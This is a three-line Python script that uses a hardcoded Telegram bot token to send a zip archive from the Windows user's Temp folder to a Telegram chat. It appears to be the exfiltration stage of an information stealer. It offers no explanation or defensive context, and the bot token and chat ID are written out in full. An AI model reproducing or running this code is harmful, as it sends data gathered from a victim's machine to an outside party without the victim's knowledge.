import os, telebot
bot = telebot.TeleBot("5896870519:AAHNJ2dcHa0V4CwQiEtInO1-hMWqrl44BSM")
bot.send_document(-1001707464183, open(fr"C:\Users\{os.getlogin()}\AppData\Local\Temp\out.zip"))